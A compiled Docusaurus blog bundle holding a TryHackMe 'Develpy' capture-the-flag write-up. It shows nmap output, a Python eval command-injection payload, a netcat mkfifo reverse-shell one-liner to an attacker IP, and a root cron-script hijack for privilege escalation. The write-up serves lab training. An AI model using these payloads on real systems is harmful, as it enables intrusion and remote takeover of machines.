"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[7015],{3905:function(e,n,t){t.d(n,{Zo:function(){return p},kt:function(){return u}});var r=t(67294);function i(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function a(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){i(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function l(e,n){if(null==e)return{};var t,r,i=function(e,n){if(null==e)return{};var t,r,i={},o=Object.keys(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||(i[t]=e[t]);return i}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(i[t]=e[t])}return i}var s=r.createContext({}),x=function(e){var n=r.useContext(s),t=n;return e&&(t="function"==typeof e?e(n):a(a({},n),e)),t},p=function(e){var n=x(e.components);return r.createElement(s.Provider,{value:n},e.children)},c={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},m=r.forwardRef((function(e,n){var t=e.components,i=e.mdxType,o=e.originalType,s=e.parentName,p=l(e,["components","mdxType","originalType","parentName"]),m=x(t),u=i,d=m["".concat(s,".").concat(u)]||m[u]||c[u]||o;return t?r.createElement(d,a(a({ref:n},p),{},{components:t})):r.createElement(d,a({ref:n},p))}));function u(e,n){var t=arguments,i=n&&n.mdxType;if("string"==typeof e||i){var o=t.length,a=new Array(o);a[0]=m;var l={};for(var s in n)hasOwnProperty.call(n,s)&&(l[s]=n[s]);l.originalType=e,l.mdxType="string"==typeof e?e:i,a[1]=l;for(var x=2;x<o;x++)a[x]=t[x];return r.createElement.apply(null,a)}return r.createElement.apply(null,t)}m.displayName="MDXCreateElement"},97093:function(e,n,t){t.r(n),t.d(n,{frontMatter:function(){return l},contentTitle:function(){return s},metadata:function(){return x},assets:function(){return p},toc:function(){return c},default:function(){return u}});var r=t(87462),i=t(63366),o=(t(67294),t(3905)),a=["components"],l={slug:"develpy",title:"THM Develpy writeup",description:"Tryhackme develpy room writeup",authors:["shivam"],image:"https://tryhackme-images.s3.amazonaws.com/room-icons/47bd9da3ef003a03478334c93013fd3a.png",tags:["python","crontab","command injection"]},s=void 0,x={permalink:"/Cybernotes/blog/develpy",source:"@site/blog/2022-02-26-Develpy/index.md",title:"THM Develpy writeup",description:"Tryhackme develpy room writeup",date:"2022-02-26T00:00:00.000Z",formattedDate:"February 26, 2022",tags:[{label:"python",permalink:"/Cybernotes/blog/tags/python"},{label:"crontab",permalink:"/Cybernotes/blog/tags/crontab"},{label:"command injection",permalink:"/Cybernotes/blog/tags/command-injection"}],readingTime:2.645,truncated:!0,authors:[{name:"0xSH1V4M",title:"Author",url:"https://github.com/shivam1317",imageURL:"https://avatars.githubusercontent.com/u/70281451?v=4",key:"shivam"}],frontMatter:{slug:"develpy",title:"THM Develpy writeup",description:"Tryhackme develpy room writeup",authors:["shivam"],image:"https://tryhackme-images.s3.amazonaws.com/room-icons/47bd9da3ef003a03478334c93013fd3a.png",tags:["python","crontab","command injection"]},prevItem:{title:"THM ChocolateFactory",permalink:"/Cybernotes/blog/chocolateFactory"},nextItem:{title:"THM Gamingserver writeup",permalink:"/Cybernotes/blog/gamingserver"}},p={authorsImageUrls:[void 0]},c=[{value:"Nmap results",id:"nmap-results",children:[],level:2},{value:"Privesc",id:"privesc",children:[],level:2}],m={toc:c};function u(e){var n=e.components,l=(0,i.Z)(e,a);return(0,o.kt)("wrapper",(0,r.Z)({},m,l,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("p",null,"Hello everyone,"),(0,o.kt)("p",null,"Today we are going to solve develpy from Tryhackme. we will see python command injection and privilege escalation with crontab."),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://tryhackme-images.s3.amazonaws.com/room-icons/47bd9da3ef003a03478334c93013fd3a.png",alt:null})),(0,o.kt)("h2",{id:"nmap-results"},"Nmap results"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-c"},'PORT      STATE SERVICE           VERSION\n22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 78:c4:40:84:f4:42:13:8e:79:f8:6b:e4:6d:bf:d4:46 (RSA)\n|   256 25:9d:f3:29:a2:62:4b:24:f2:83:36:cf:a7:75:bb:66 (ECDSA)\n|_  256 e7:a0:07:b0:b9:cb:74:e9:d6:16:7d:7a:67:fe:c1:1d (ED25519)\n10000/tcp open  snet-sensor-mgmt?\n| fingerprint-strings:\n|   GenericLines:\n|     Private 0days\n|     Please enther number of exploits to send??: Traceback (most recent call last):\n|     File "./exploit.py", line 6, in <module>\n|     num_exploits = int(input(\' Please enther number of exploits to send??: \'))\n|     File "<string>", line 0\n|     SyntaxError: unexpected EOF while parsing\n|   GetRequest:\n|     Private 0days\n|     Please enther number of exploits to send??: Traceback (most recent call last):\n|     File "./exploit.py", line 6, in <module>\n|     num_exploits = int(input(\' Please enther number of exploits to send??: \'))\n|     File "<string>", line 1, in <module>\n|     NameError: name \'GET\' is not defined\n|   HTTPOptions, RTSPRequest:\n|     Private 0days\n|     Please enther number of exploits to send??: Traceback (most recent call last):\n|     File "./exploit.py", line 6, in <module>\n|     num_exploits = int(input(\' Please enther number of exploits to send??: \'))\n|     File "<string>", line 1, in <module>\n|     NameError: name \'OPTIONS\' is not defined\n|   NULL:\n|     Private 0days\n|_    Please enther number of exploits to send??:\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port10000-TCP:V=7.91%I=7%D=9/3%Time=6132570A%P=x86_64-pc-linux-gnu%r(NU\nSF:LL,48,"\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Private\\x200days\\r\\n\\r\\n\\x20\nSF:Please\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\?\\?:\\x20")%r\nSF:(GetRequest,136,"\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Private\\x200days\\r\nSF:\\n\\r\\n\\x20Please\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\?\\\nSF:?:\\x20Traceback\\x20\\(most\\x20recent\\x20call\\x20last\\):\\r\\n\\x20\\x20File\\\nSF:x20\\"\\./exploit\\.py\\",\\x20line\\x206,\\x20in\\x20<module>\\r\\n\\x20\\x20\\x20\\\nSF:x20num_exploits\\x20=\\x20int\\(input\\(\'\\x20Please\\x20enther\\x20number\\x20\nSF:of\\x20exploits\\x20to\\x20send\\?\\?:\\x20\'\\)\\)\\r\\n\\x20\\x20File\\x20\\"<string\nSF:>\\",\\x20line\\x201,\\x20in\\x20<module>\\r\\nNameError:\\x20name\\x20\'GET\'\\x20\nSF:is\\x20not\\x20defined\\r\\n")%r(HTTPOptions,13A,"\\r\\n\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20Private\\x200days\\r\\n\\r\\n\\x20Please\\x20enther\\x20number\\x20of\nSF:\\x20exploits\\x20to\\x20send\\?\\?:\\x20Traceback\\x20\\(most\\x20recent\\x20cal\nSF:l\\x20last\\):\\r\\n\\x20\\x20File\\x20\\"\\./exploit\\.py\\",\\x20line\\x206,\\x20in\nSF:\\x20<module>\\r\\n\\x20\\x20\\x20\\x20num_exploits\\x20=\\x20int\\(input\\(\'\\x20P\nSF:lease\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\?\\?:\\x20\'\\)\\)\nSF:\\r\\n\\x20\\x20File\\x20\\"<string>\\",\\x20line\\x201,\\x20in\\x20<module>\\r\\nNa\nSF:meError:\\x20name\\x20\'OPTIONS\'\\x20is\\x20not\\x20defined\\r\\n")%r(RTSPReque\nSF:st,13A,"\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Private\\x200days\\r\\n\\r\\n\\x2\nSF:0Please\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\?\\?:\\x20Tra\nSF:ceback\\x20\\(most\\x20recent\\x20call\\x20last\\):\\r\\n\\x20\\x20File\\x20\\"\\./e\nSF:xploit\\.py\\",\\x20line\\x206,\\x20in\\x20<module>\\r\\n\\x20\\x20\\x20\\x20num_ex\nSF:ploits\\x20=\\x20int\\(input\\(\'\\x20Please\\x20enther\\x20number\\x20of\\x20exp\nSF:loits\\x20to\\x20send\\?\\?:\\x20\'\\)\\)\\r\\n\\x20\\x20File\\x20\\"<string>\\",\\x20l\nSF:ine\\x201,\\x20in\\x20<module>\\r\\nNameError:\\x20name\\x20\'OPTIONS\'\\x20is\\x2\nSF:0not\\x20defined\\r\\n")%r(GenericLines,13B,"\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20Private\\x200days\\r\\n\\r\\n\\x20Please\\x20enther\\x20number\\x20of\\x20\nSF:exploits\\x20to\\x20send\\?\\?:\\x20Traceback\\x20\\(most\\x20recent\\x20call\\x2\nSF:0last\\):\\r\\n\\x20\\x20File\\x20\\"\\./exploit\\.py\\",\\x20line\\x206,\\x20in\\x20\nSF:<module>\\r\\n\\x20\\x20\\x20\\x20num_exploits\\x20=\\x20int\\(input\\(\'\\x20Pleas\nSF:e\\x20enther\\x20number\\x20of\\x20exploits\\x20to\\x20send\\?\\?:\\x20\'\\)\\)\\r\\n\nSF:\\x20\\x20File\\x20\\"<string>\\",\\x20line\\x200\\r\\n\\x20\\x20\\x20\\x20\\r\\n\\x20\\\nSF:x20\\x20\\x20\\^\\r\\nSyntaxError:\\x20unexpected\\x20EOF\\x20while\\x20parsing\\\nSF:r\\n");\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 133.32 seconds\n')),(0,o.kt)("hr",null),(0,o.kt)("p",null,"--\x3e i found nothing after opening port ",(0,o.kt)("inlineCode",{parentName:"p"},"10000")," on browser but i knew that it's executing python code so let's try to connect with netcat"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"nc <ip> <port>")),(0,o.kt)("p",null,"--\x3e and i found this :"),(0,o.kt)("p",null,(0,o.kt)("img",{src:t(77885).Z,width:"1173",height:"287"})),(0,o.kt)("p",null,"--\x3e that means it's pinging tryhackme 2 times so we have to do something called ",(0,o.kt)("inlineCode",{parentName:"p"},"python command injection")),(0,o.kt)("p",null,"--\x3e so i found this website for this"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://www.stackhawk.com/blog/command-injection-python/"},"https://www.stackhawk.com/blog/command-injection-python/")),(0,o.kt)("p",null,"--\x3e and i made this payload"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"__import__('os').system(\"id\")\n")),(0,o.kt)("p",null,"--\x3e and i got the result of id command !"),(0,o.kt)("p",null,(0,o.kt)("img",{src:t(85713).Z,width:"1647",height:"253"})),(0,o.kt)("p",null,"--\x3e so now we can get the reverse shell from this !"),(0,o.kt)("hr",null),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"__import__('os').system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.2.152 4444 >/tmp/f\")\n")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"privesc"},"Privesc"),(0,o.kt)("p",null,"--\x3e i found 2 files in ",(0,o.kt)("inlineCode",{parentName:"p"},"/home/king")," ",(0,o.kt)("inlineCode",{parentName:"p"},"root.sh")," and ",(0,o.kt)("inlineCode",{parentName:"p"},"run.sh")," so i think there should be some cronjob running in the backend so i checked ",(0,o.kt)("inlineCode",{parentName:"p"},"/etc/crontab")," and found 3 cronjobs"),(0,o.kt)("p",null,(0,o.kt)("img",{src:t(11180).Z,width:"1399",height:"389"})),(0,o.kt)("p",null,"--\x3e then i executed ",(0,o.kt)("inlineCode",{parentName:"p"},"pspy")," and found that ",(0,o.kt)("inlineCode",{parentName:"p"},"root.sh")," is running as root every 1 min"),(0,o.kt)("p",null,"--\x3e but we don't have permissions to write on that file"),(0,o.kt)("p",null,"--\x3e so i deleted ",(0,o.kt)("inlineCode",{parentName:"p"},"root.sh")," file because it's in our home directory so we can delete it and after i addded reverse shell in that file and gav e ",(0,o.kt)("inlineCode",{parentName:"p"},"777")," permission to execute it !"),(0,o.kt)("p",null,"--\x3e now just start listner on netcat"),(0,o.kt)("p",null,"--\x3e and after 1 minute i got root !"),(0,o.kt)("p",null,(0,o.kt)("img",{src:t(67324).Z,width:"1205",height:"317"})))}u.isMDXComponent=!0},77885:function(e,n,t){n.Z=t.p+"assets/images/Pastedimage20210903143044-97aa72b26519afb39cd0a5f1df4af960.png"},85713:function(e,n,t){n.Z=t.p+"assets/images/Pastedimage20210903143250-5e790ab745df8b9dcd30f3f06f3b99ca.png"},11180:function(e,n,t){n.Z=t.p+"assets/images/Pastedimage20210904035052-7c96c3024c6701eac40d5de0cadbb2c8.png"},67324:function(e,n,t){n.Z=t.p+"assets/images/Pastedimage20210904035326-55eba5aaa1699af91327ff9ec3b260ac.png"}}]);